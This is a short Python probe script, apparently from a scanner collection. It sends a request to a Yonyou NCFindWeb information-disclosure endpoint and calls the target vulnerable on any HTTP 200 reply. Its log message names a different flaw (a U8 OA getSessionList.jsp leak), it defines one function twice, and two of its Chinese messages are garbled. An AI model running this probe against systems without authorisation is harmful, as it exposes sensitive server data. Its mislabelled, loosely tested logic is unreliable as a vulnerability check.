import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    print(now_time() + ' [INFO]     正在检测用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞')
    url = target_url + '/NCFindWeb?service=IPreAlertConfigService&filename='
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and response.text != None:
            print(now_time() + " [SUCCESS]  该系统可能数据库管理信息泄漏漏洞，具体URL为:{}".format(url))
        else:
            print(now_time() + ' [WARNING]  该系统不存在此漏洞')
    except:
        print(now_time() + ' [WARNING]  无法该目标无法建立连接')
